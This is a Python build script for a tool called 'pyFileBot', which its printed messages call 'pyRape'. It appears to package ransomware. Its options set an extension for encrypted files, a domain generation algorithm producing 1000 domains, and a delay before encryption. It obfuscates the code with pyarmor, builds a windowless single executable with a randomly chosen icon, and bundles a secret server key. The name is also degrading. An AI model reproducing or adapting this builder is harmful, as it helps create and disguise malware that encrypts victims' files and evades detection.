#!/usr/bin/env python

import os
import subprocess
import shutil
import argparse

from random import choice


def main():
    parser = argparse.ArgumentParser(description='Building pyFileBot with options')
    parser.add_argument('-s', '--share', help='Add shares (default: False)', action="store_false", default=False)
    parser.add_argument('-e', '--ext', help='Extension to be added on encrypted file (default is same file name)',
                        action="store", default="")
    parser.add_argument('-o', '--out', help='Output directory for files (default is "dist/")', action="store",
                        default="./dist")
    parser.add_argument('-n', '--dga_n', help='Number of domains to generate (default: 1000)', type=int, default=1000)
    parser.add_argument('-t', '--delay', help='Delay encryption in seconds (default: 0)', type=int, default=0)
    args = vars(parser.parse_args())

    favicons = os.listdir("utils/favicons/")

    print("********* Preparing pyRape")

    shutil.rmtree(args['out'], ignore_errors=True)
    os.makedirs(args['out'], exist_ok=True)
    os.makedirs("./build", exist_ok=True)


    print("--------> Packaging")
    cmd = f'venv/Scripts/pyarmor.exe -q  pack -x "--exclude venv --exclude tests" -e " --noconsole --distpath {args["out"]}  --icon=utils/favicons/{choice(favicons)} --onefile  --add-tmp_data build/config.json;. --add-tmp_data build/sk.pem;.  --add-tmp_data utils/text.txt;. --add-tmp_data venv/Scripts/px.exe;."  main.pyOLD'
    p = subprocess.Popen(cmd, universal_newlines=True)
    p.wait()
    shutil.rmtree('./build', ignore_errors=True)

    print(f'--------> pyRape and secret server key located into {args["out"]} directory')
    exit()


if __name__ == "__main__":
    main()
